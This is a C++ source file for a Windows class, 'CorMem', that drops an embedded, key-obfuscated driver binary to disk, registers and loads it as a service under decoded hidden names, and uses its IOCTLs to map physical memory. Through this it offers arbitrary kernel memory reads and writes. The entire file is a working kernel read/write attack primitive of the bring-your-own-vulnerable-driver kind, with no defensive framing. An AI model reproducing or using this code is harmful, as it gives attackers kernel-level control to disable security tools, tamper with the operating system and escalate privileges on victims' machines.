#include "CorMem.h"
#include "FileUtils.hpp"
#include "CorMemBin.hpp"
#include "va2pa.h"
#include "Log.hpp"

BOOLEAN CorMem::Initialize() noexcept
{
	if (m_bInitialized)
	{
		return m_bInitialized;
	}

	// Create the driver file from the resource data
	std::string driverFullPath;
	if (!FileUtils::CreateDriverFile(driverFullPath,
									 (const char*)CorMemBin::hexData,
									 CorMemBin::HexDataSize,
									 CorMemBin::Key))
	{
		LOG("[-] CreateDriverFile failed");
		return FALSE;
	}

	// Register and start the driver service
	//std::string strServiceName{ CorMemBin::service };
	// Get the device name from the resource data
	std::string serviceName = FileUtils::GetServiceName(CorMemBin::service,
													   CorMemBin::serviceLength,
													   CorMemBin::Key);
	if (serviceName.empty())
	{
		return FALSE;
	}

	m_pDriverService = new DriverService(driverFullPath, serviceName);
	if (!m_pDriverService)
	{
		LOG("[-] Failed to create DriverService instance");
		return FALSE;
	}

	if (!NT_SUCCESS(m_pDriverService->RegisterService()))
	{
		LOG("[-] Failed to register driver service");
		return FALSE;
	}

	// Load the driver
	if (!NT_SUCCESS(m_pDriverService->LoadDriver()))
	{
		LOG("[-] Failed to load driver");
		return FALSE;
	}

	// Create Device 
	std::string deviceName = FileUtils::GetServiceName(CorMemBin::ServiceName,
													   CorMemBin::ServiceNameSize,
													   CorMemBin::Key);
	m_hDevice = CreateDevice(deviceName.c_str());

	if (INVALID_HANDLE_VALUE == m_hDevice)
	{
		return FALSE;
	}

	m_bInitialized = TRUE;
	return TRUE;
}

VOID CorMem::Uninitialize()
{
	if (m_pDriverService)
	{
		m_pDriverService->StopAndUnregister();

		delete m_pDriverService;
		m_pDriverService = nullptr;
	}

	if (INVALID_HANDLE_VALUE != m_hDevice)
	{
		CloseHandle(m_hDevice);
		m_hDevice = INVALID_HANDLE_VALUE;
	}
	m_bInitialized = FALSE;
}

BOOLEAN 
CorMem::KernelRead(
	PVOID	VirtualAddress,
	PVOID	ReadBuffer,
	SIZE_T	ReadSize)
{
	if (INVALID_HANDLE_VALUE == m_hDevice)
	{
		LOG("[-] CorMem device handle is invalid. Ensure the driver is loaded and the device is accessible.");
		return FALSE;
	}

	if (!VirtualAddress || !ReadBuffer || !ReadSize || !m_bInitialized)
	{
		LOG("[-] Invalid parameters for KernelRead.");
		return FALSE;
	}

	if (ReadSize <= 0x1000)
	{
		PVOID pPhysicalAddress = this->VirtualToPhysical(VirtualAddress);
		if (!pPhysicalAddress)
		{
			LOG("VirtualToPhysical failed!!!");
			return FALSE;
		}

		auto pMappedAddress = MapPhysicalMemory(pPhysicalAddress, ReadSize);
		if (!pMappedAddress)
		{
			LOG("[-] Failed to map physical memory. Error code: %lu" << std::hex << GetLastError() << std::dec);
			return FALSE;
		}

		RtlCopyMemory(ReadBuffer, pMappedAddress, ReadSize);
		UnmapPhysicalMemory(pMappedAddress);
	}
	else
	{
		// ReadSize > 0x1000, need to read page by page
		ULONG NumberOfPages = static_cast<ULONG>((ReadSize + 0xFFF) / 0x1000);
		for (auto i{ 0u }; i < NumberOfPages; ++i)
		{
			PVOID pPhysicalAddress = VirtualToPhysical(reinterpret_cast<PUCHAR>(VirtualAddress) + i * 0x1000);
			if (!pPhysicalAddress)
			{
				LOG("VirtualToPhysical failed!!!");
				return FALSE;
			}

			if (i != NumberOfPages - 1)
			{
				auto pMappedAddress = MapPhysicalMemory(pPhysicalAddress, 0x1000);
				if (!pMappedAddress)
				{
					LOG("[-] Failed to map physical memory. Error code: %lu" << std::hex << GetLastError() << std::dec);
					return FALSE;
				}

				RtlCopyMemory(reinterpret_cast<PUCHAR>(ReadBuffer) + i * 0x1000, pMappedAddress, 0x1000);
				UnmapPhysicalMemory(pMappedAddress);
			}
			else
			{
				// Last page, calculate the remaining size
				ULONG RemainingSize = static_cast<ULONG>(ReadSize - i * 0x1000);

				auto pMappedAddress = MapPhysicalMemory(pPhysicalAddress, RemainingSize);
				if (!pMappedAddress)
				{
					LOG("[-] Failed to map physical memory. Error code: %lu" << std::hex << GetLastError() << std::dec);
					return FALSE;
				}

				RtlCopyMemory(reinterpret_cast<PUCHAR>(ReadBuffer) + i * 0x1000, pMappedAddress, RemainingSize);
				UnmapPhysicalMemory(pMappedAddress);
			}
		}


	}

	return TRUE;
}

BOOLEAN
CorMem::KernelWrite(
	PVOID VirtualAddress, 
	PVOID WriteBuffer, 
	SIZE_T WriteSize)
{
	if (!VirtualAddress || !WriteBuffer || !WriteSize || !m_bInitialized)
	{
		LOG("[-] Invalid parameters for KernelWrite.");
		return FALSE;
	}

	if (WriteSize <= 0x1000)
	{
		PVOID pPhysicalAddress = this->VirtualToPhysical(VirtualAddress);
		if (!pPhysicalAddress)
		{

			LOG("[-] Failed to translate virtual address to physical address using MemoryMap.");
			return FALSE;

		}

		auto pMappedAddress = MapPhysicalMemory(pPhysicalAddress, WriteSize);
		if (!pMappedAddress)
		{
			LOG("[-] Failed to map physical memory.");
			return FALSE;
		}

		RtlCopyMemory(pMappedAddress, WriteBuffer, WriteSize);
		UnmapPhysicalMemory(pMappedAddress);
	}
	else
	{
		// WriteSize > 0x1000
		ULONG NumberOfPages = static_cast<ULONG>((WriteSize + 0xFFF) / 0x1000);
		for (auto i{ 0u }; i < NumberOfPages; ++i)
		{
			PVOID pPhysicalAddress = VirtualToPhysical(reinterpret_cast<PUCHAR>(VirtualAddress) + i * 0x1000);
			if (!pPhysicalAddress)
			{

				LOG("[-] Failed to translate virtual address to physical address using MemoryMap.");
				return FALSE;

			}
			if (i != NumberOfPages - 1)
			{
				auto pMappedAddress = MapPhysicalMemory(pPhysicalAddress, 0x1000);
				if (!pMappedAddress)
				{
					LOG("[-] Failed to map physical memory.");
					return FALSE;
				}

				RtlCopyMemory(pMappedAddress, reinterpret_cast<PUCHAR>(WriteBuffer) + i * 0x1000, 0x1000);
				UnmapPhysicalMemory(pMappedAddress);
			}
			else
			{
				// Last page, calculate the remaining size
				ULONG RemainingSize = static_cast<ULONG>(WriteSize - i * 0x1000);
				auto pMappedAddress = MapPhysicalMemory(pPhysicalAddress, RemainingSize);
				if (!pMappedAddress)
				{
					LOG("[-] Failed to map physical memory.");
					return FALSE;
				}

				RtlCopyMemory(pMappedAddress, reinterpret_cast<PUCHAR>(WriteBuffer) + i * 0x1000, RemainingSize);
				UnmapPhysicalMemory(pMappedAddress);
			}
		}
	}

	return TRUE;
}


PVOID
CorMem::MapPhysicalMemory(
	PVOID	PhysicalAddress,
	SIZE_T	Size)
{
	struct
	{
		PVOID	PhysicalAddress;
		SIZE_T	Size;
		PVOID	Reserved;
	} Request;
	Request.PhysicalAddress = PhysicalAddress;
	Request.Size = Size;
	Request.Reserved = nullptr;

	PVOID pMappedAddress = nullptr;
	DWORD dwBytesReturned = 0;

	if (DeviceIoControl(m_hDevice, 
						IOCTL_MAP, 
						&Request, 
						sizeof(Request),
						&pMappedAddress, 
						sizeof(pMappedAddress),
						&dwBytesReturned, 
						nullptr))
	{
		return pMappedAddress;
	}
	return nullptr;
}

VOID 
CorMem::UnmapPhysicalMemory(
	PVOID MappedAddress)
{
	if (!MappedAddress)
	{
		return;
	}
	DWORD dwBytesReturned = 0;
	DeviceIoControl(m_hDevice, 
					IOCTL_UNMAP, 
					&MappedAddress, 
					sizeof(MappedAddress), 
					nullptr, 
					0, 
					&dwBytesReturned, 
					nullptr);
}

PVOID 
CorMem::VirtualToPhysical(PVOID VirtualAddress)
{
	if (!VirtualAddress)
	{
		LOG("[-] Invalid virtual address provided to VirtualToPhysical.");
		return nullptr;
	}

	PVOID pPhysicalAddress = VirtualAddress;
	
	DWORD dwBytesReturned = 0;
	auto bRet = DeviceIoControl(m_hDevice,
								IOCTL_V2P,
								&pPhysicalAddress,
								sizeof(pPhysicalAddress),
								&pPhysicalAddress,
								sizeof(pPhysicalAddress),
								&dwBytesReturned, 
								nullptr);
	if (!bRet || 0 == pPhysicalAddress)
	{
		LOG("[-] Failed to translate virtual address to physical address. Error code: %lu" << GetLastError());
		return Va2Pa(VirtualAddress);
	}
	
	return pPhysicalAddress;
}

HANDLE CorMem::CreateDevice(const char* DeviceName)
{
	m_hDevice = CreateFileA(DeviceName,
							GENERIC_READ | GENERIC_WRITE,
							0,
							nullptr,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							nullptr);

	return m_hDevice;
}
